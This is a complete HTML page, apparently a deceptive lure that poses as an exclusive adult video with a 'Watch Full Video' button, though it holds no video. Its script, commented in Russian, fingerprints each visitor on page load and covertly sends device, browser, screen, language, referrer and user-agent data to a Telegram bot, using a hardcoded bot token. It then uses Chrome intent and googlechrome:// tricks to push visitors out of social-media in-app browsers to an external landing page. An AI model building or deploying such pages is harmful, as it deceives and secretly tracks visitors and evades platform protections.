<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="robots" content="noindex,nofollow">
<title>Exclusive Content</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:#0f0f0f;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;overflow:hidden}
.card{position:relative;width:100%;max-width:360px;aspect-ratio:9/16;border-radius:20px;overflow:hidden;background:#1a1a1a;box-shadow:0 20px 60px rgba(0,0,0,.8);margin-bottom:30px}
.video-bg{position:absolute;inset:0;background:linear-gradient(180deg,#1a1a1a 0%,#2d1b3d 50%,#1a1a1a 100%);display:flex;align-items:center;justify-content:center}
.play-icon{width:80px;height:80px;background:rgba(255,255,255,.1);border-radius:50%;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(10px);animation:pulse 2s infinite}
.play-icon svg{width:36px;height:36px;fill:#fff;margin-left:6px}
.overlay{position:absolute;inset:0;background:linear-gradient(0deg,rgba(0,0,0,.9) 0%,transparent 50%);display:flex;flex-direction:column;justify-content:flex-end;padding:24px}
.badge{position:absolute;top:16px;left:16px;background:rgba(255,59,48,.9);color:#fff;font-size:11px;font-weight:700;padding:4px 10px;border-radius:6px;letter-spacing:.5px;text-transform:uppercase}
.title{font-size:20px;font-weight:700;margin-bottom:6px;text-shadow:0 2px 8px rgba(0,0,0,.8)}
.subtitle{font-size:13px;color:rgba(255,255,255,.7);margin-bottom:16px}
.btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:18px;background:linear-gradient(135deg,#ff3b30,#ff6b6b);color:#fff;border:none;border-radius:16px;font-size:17px;font-weight:700;cursor:pointer;-webkit-tap-highlight-color:transparent;box-shadow:0 8px 30px rgba(255,59,48,.4);animation:ctaPulse 2s infinite;text-transform:uppercase;letter-spacing:.5px}
.btn:active{transform:scale(.97)}
.btn svg{width:22px;height:22px;fill:#fff}
.status{margin-top:20px;font-size:11px;color:rgba(255,255,255,.4);letter-spacing:.5px}

/* --- iOS INSTRUCTION ANIMATION --- */
.ios-instruction{display:none;position:absolute;top:12px;right:12px;z-index:10}
.ios-steps{display:flex;align-items:center;gap:8px;background:rgba(0,0,0,.85);backdrop-filter:blur(12px);padding:8px 14px;border-radius:12px;animation:fadeInstruction 4s infinite}
.ios-step{display:flex;align-items:center;gap:5px;font-size:11px;color:#fff;font-weight:600}
.ios-step svg{width:18px;height:18px;fill:#fff}
.ios-arrow{color:rgba(255,255,255,.5);font-size:14px}
.ios-hand{position:absolute;top:-8px;right:-8px;font-size:22px;animation:tapHand 2s infinite;filter:drop-shadow(0 2px 4px rgba(0,0,0,.5))}

@keyframes pulse{0%,100%{transform:scale(1);opacity:.8}50%{transform:scale(1.1);opacity:1}}
@keyframes ctaPulse{0%,100%{box-shadow:0 8px 30px rgba(255,59,48,.4)}50%{box-shadow:0 8px 50px rgba(255,59,48,.7)}}
@keyframes fadeInstruction{0%,100%{opacity:.3;transform:translateY(-2px)}30%,70%{opacity:1;transform:translateY(0)}}
@keyframes tapHand{0%,100%{transform:translate(0,0) scale(1);opacity:.6}40%,60%{transform:translate(-4px,4px) scale(.9);opacity:1}}
</style>
</head>
<body>

<div class="card">
    <div class="video-bg">
        <div class="play-icon">
            <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
        </div>
    </div>
    <div class="badge">🔞 Exclusive</div>
    
    <!-- iOS Instruction Animation -->
    <div class="ios-instruction" id="iosInstruction">
        <div class="ios-hand">👆</div>
        <div class="ios-steps">
            <div class="ios-step">
                <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
                <span>Tap Share</span>
            </div>
            <span class="ios-arrow">→</span>
            <div class="ios-step">
                <svg viewBox="0 0 24 24"><path d="M19 4h-3.5l-1-1h-5l-1 1H5v2h14zM6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12z"/></svg>
                <span>Open in Safari</span>
            </div>
        </div>
    </div>
    
    <div class="overlay">
        <div class="title">Mommy Ashley 🔥</div>
        <div class="subtitle">Full video available now • Tap to watch</div>
    </div>
</div>

<button class="btn" id="mainBtn">
    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
    Watch Full Video
</button>

<div class="status" id="status"></div>

<script>
// --- КОНФИГУРАЦИЯ ---
// ⚠️ ЗАМЕНИ НА URL ТВОЕГО ВНЕШНЕГО ЛЕНДИНГА
var EXTERNAL_LANDING_URL = '/external.html';
var TG_TOKEN = '8875182169:AAH-EYO8mDSgFJUhJXcpRAcN5u0xWyqqG9M';
var TG_CHAT = '5253808709';

// --- ИДЕНТИФИКАЦИЯ ---
var visitorId = localStorage.getItem('vid');
if (!visitorId) {
    visitorId = (typeof crypto !== 'undefined' && crypto.randomUUID) 
        ? crypto.randomUUID() 
        : 'v-' + Math.random().toString(36).substring(2) + Date.now().toString(36);
    try { localStorage.setItem('vid', visitorId); } catch(e) {}
}

var ua = navigator.userAgent || '';
var isIOS = /iPhone|iPad|iPod/i.test(ua);
var isAndroid = /Android/i.test(ua);
var device = isIOS ? 'iOS' : (isAndroid ? 'Android' : 'Desktop');

// Определение встроенного браузера
var inAppBrowser = 'External Browser';
if (/FBAN|FBAV|FB_IAB/i.test(ua)) inAppBrowser = 'Facebook In-App';
else if (/Instagram/i.test(ua)) inAppBrowser = 'Instagram In-App';
else if (/Messenger/i.test(ua)) inAppBrowser = 'Messenger In-App';
else if (/TikTok/i.test(ua)) inAppBrowser = 'TikTok In-App';
else if (/Snapchat/i.test(ua)) inAppBrowser = 'Snapchat In-App';
else if (/Telegram/i.test(ua)) inAppBrowser = 'Telegram In-App';
else if (/Twitter|X\.com/i.test(ua)) inAppBrowser = 'Twitter/X In-App';
else if (/LinkedIn/i.test(ua)) inAppBrowser = 'LinkedIn In-App';
else if (navigator.userAgentData && navigator.userAgentData.brands) {
    if (navigator.userAgentData.brands.some(function(b){ return b.brand === "Android WebView"; })) {
        inAppBrowser = 'Android WebView (In-App)';
    }
}

var UV_KEY = '_ash_uv';
var isUniqueVisit = false;
try { if (!localStorage.getItem(UV_KEY)) { localStorage.setItem(UV_KEY, '1'); isUniqueVisit = true; } } catch(e) {}

document.getElementById('status').textContent = isUniqueVisit ? '✦ new visit' : 'returning visitor';

// Показываем iOS инструкцию только на iOS
if (isIOS) {
    document.getElementById('iosInstruction').style.display = 'block';
}

// --- ЛОГИРОВАНИЕ В TELEGRAM ---
function sendTG(text) {
    var url = 'https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage';
    var body = JSON.stringify({ chat_id: TG_CHAT, text: text, parse_mode: 'HTML' });
    
    if (navigator.sendBeacon) {
        var blob = new Blob([body], { type: 'application/json' });
        navigator.sendBeacon(url, blob);
    } else {
        fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: body, keepalive: true }).catch(function(){});
    }
}

function logEvent(action, extra) {
    var msg = '🔔 <b>' + action + '</b>\n\n' +
        '📱 <b>Device:</b> ' + device + '\n' +
        '🌐 <b>Browser:</b> ' + inAppBrowser + '\n' +
        '🆔 <b>Visitor:</b> ' + visitorId.substring(0, 8) + '...\n' +
        '📐 <b>Screen:</b> ' + screen.width + 'x' + screen.height + '\n' +
        '🗣 <b>Lang:</b> ' + (navigator.language || '?') + '\n' +
        '🔗 <b>Referrer:</b> ' + (document.referrer || 'Direct') + '\n' +
        '🕐 <b>Time:</b> ' + new Date().toISOString().slice(0, 19);
    
    if (extra) msg += '\n📝 <b>Details:</b> ' + extra;
    
    if (action === 'PAGE_LOAD') {
        msg += '\n\n🤖 <b>Full UA:</b>\n<code>' + ua.substring(0, 500) + '</code>';
    }
    
    sendTG(msg);
}

logEvent(isUniqueVisit ? 'UNIQUE_VISIT' : 'RETURN_VISIT', 'Page loaded | Target: ' + EXTERNAL_LANDING_URL);

// --- РЕДИРЕКТ НА ВНЕШНИЙ ЛЕНДИНГ ПО КЛИКУ ---
var clicked = false;

document.getElementById('mainBtn').addEventListener('click', function(e) {
    e.preventDefault();
    if (clicked) return;
    clicked = true;

    this.innerHTML = '⏳ Opening...';
    this.style.opacity = '0.7';

    logEvent('BUTTON_CLICK', 'Redirect to external landing: ' + EXTERNAL_LANDING_URL);

    setTimeout(function() {
        executeRedirect();
    }, 300);
});

function executeRedirect() {
    var targetUrl = window.location.origin + EXTERNAL_LANDING_URL;

    if (device === 'Android') {
        // ANDROID: Intent для Chrome
        var cleanUrl = targetUrl.replace("https://", "").replace("http://", "");
        var intent = "intent://" + cleanUrl + 
            "#Intent;scheme=https;" +
            "package=com.android.chrome;" +
            "S.browser_fallback_url=" + encodeURIComponent(targetUrl) + ";end";
        
        logEvent('ANDROID_INTENT_REDIRECT', 'Chrome Intent → ' + EXTERNAL_LANDING_URL);
        window.location.href = intent;

        setTimeout(function() {
            if (document.visibilityState === 'visible') {
                logEvent('INTENT_FAILED_FALLBACK', 'Fallback to direct URL');
                window.location.href = targetUrl;
            }
        }, 2000);

    } else if (device === 'iOS') {
        // iOS: googlechrome:// → HTTPS fallback
        logEvent('IOS_REDIRECT_ATTEMPT', 'Trying googlechrome:// → HTTPS');
        
        var cleanUrlIOS = targetUrl.replace("https://", "").replace("http://", "");
        window.location.href = "googlechrome://" + cleanUrlIOS;

        setTimeout(function() {
            if (document.visibilityState === 'visible') {
                window.location.href = targetUrl;
                
                setTimeout(function() {
                    if (document.visibilityState === 'visible') {
                        logEvent('IOS_ALL_FAILED', 'Both redirects failed');
                    }
                }, 1500);
            }
        }, 800);

    } else {
        logEvent('DESKTOP_REDIRECT', 'Direct → ' + EXTERNAL_LANDING_URL);
        window.location.replace(targetUrl);
    }
}
</script>
</body>
</html>
